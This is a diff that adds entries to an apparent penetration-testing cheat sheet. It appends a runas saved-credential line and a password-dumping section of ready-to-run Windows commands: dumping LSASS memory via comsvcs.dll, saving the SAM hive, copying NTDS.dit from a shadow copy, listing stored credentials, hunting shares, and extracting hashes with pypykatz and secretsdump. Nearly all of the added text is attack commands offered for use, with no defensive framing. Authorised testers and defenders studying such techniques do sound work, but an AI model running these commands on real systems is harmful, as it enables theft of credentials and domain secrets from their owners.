@@ -619,6 +619,12 @@ $ python psexec.py <username>:<password>@<IP address>
 $ python psexec.py <username>@<IP address>
 ```
 
+- Runas
+
+```
+C:\> runas /savecred /user:<username> cmd
+```
+
 #5. - Privilege Escalation
 -----------------------------------------
 
@@ -827,6 +833,68 @@ $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 
 #7. - Password Dumping
 -----------------------------------------
+
+- Findstr
+
+```
+C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml	
+```
+
+- Rundll32
+
+```
+PS C:\> Get-Process lsass
+PS :\> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+```
+
+- Reg
+
+```
+C:\> reg.exe save hklm\sam C:\sam.save
+```
+
+- Vssadmin
+
+```
+C:\> vssadmin CREATE SHADOW /For=C:	
+```
+
+- NTDS.dit
+
+```
+C:\> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
+
+- Windows Credential Manager
+
+```
+C:\> rundll32 keymgr.dll,KRShowKeyMgr
+C:\> cmdkey /list
+```
+
+- Snaffler
+
+```
+C:\> snaffler.exe -s
+```
+
+- Invoke-HuntSMBShares
+
+```
+PS C:\> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+```
+
+- Pypykatz
+
+```
+$ pypykatz lsa minidump lsass.dmp
+```
+
+- Secretsdump
+
+```
+$ python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
 
 #8. - File Transfers
 -----------------------------------------
